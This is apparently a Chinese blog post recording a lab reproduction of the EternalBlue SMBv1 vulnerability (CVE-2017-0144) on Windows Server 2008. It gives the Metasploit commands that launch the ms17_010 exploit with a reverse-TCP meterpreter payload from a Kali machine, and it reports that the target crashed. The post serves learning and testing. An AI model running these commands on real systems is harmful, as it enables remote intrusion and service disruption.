# Windows Server 2008 CVE20170144验证

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29567192&auto=1&height=66"></iframe>  

歌挺好听，奈何水文太短，看完歌都没听完。😂抱歉了~嘿嘿嘿

本文也是照着别人写的例子完全操作成功了，然后再记录下来的，为方便以后使用，特此整理记录。

### 漏洞信息
CVEID：2017-0144  
漏洞名称：Windows server 2008系列缓冲区溢出漏洞（永恒之蓝）  
发布时间：2017-03-14

### 漏洞简介
Server Message Block（SMB）Server是为计算机提供身份验证用以访问服务器上打印机和文件系统的组件。 Microsoft Windows中的SMBv1服务器存在远程代码执行漏洞。远程攻击者可借助特制的数据包利用该漏洞执行任意代码。

### 实验环境
Kali x64（攻击机）：192.168.0.6  
Windows server 2008 x64（靶机）：192.168.0.9

```sh
msfconsole
use exploit/windows/smb/ms17_010_eternalbluer
set LHOST 192.168.0.6 
set RHOST 192.168.0.9 
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

![winserver2008attack1](/images/posts/winserver2008attack1.png)



![winserver2008attack2](/images/posts/winserver2008attack2.png)



### 现象：

靶机windows server 2008 x64蓝屏宕机重启。

 ![winserver2008crush](/images/posts/winserver2008-crush.png)


---

> : 蓝红柿  
> URL: http://localhost:1313/zh/posts/win-server-2008-cve20170144/  

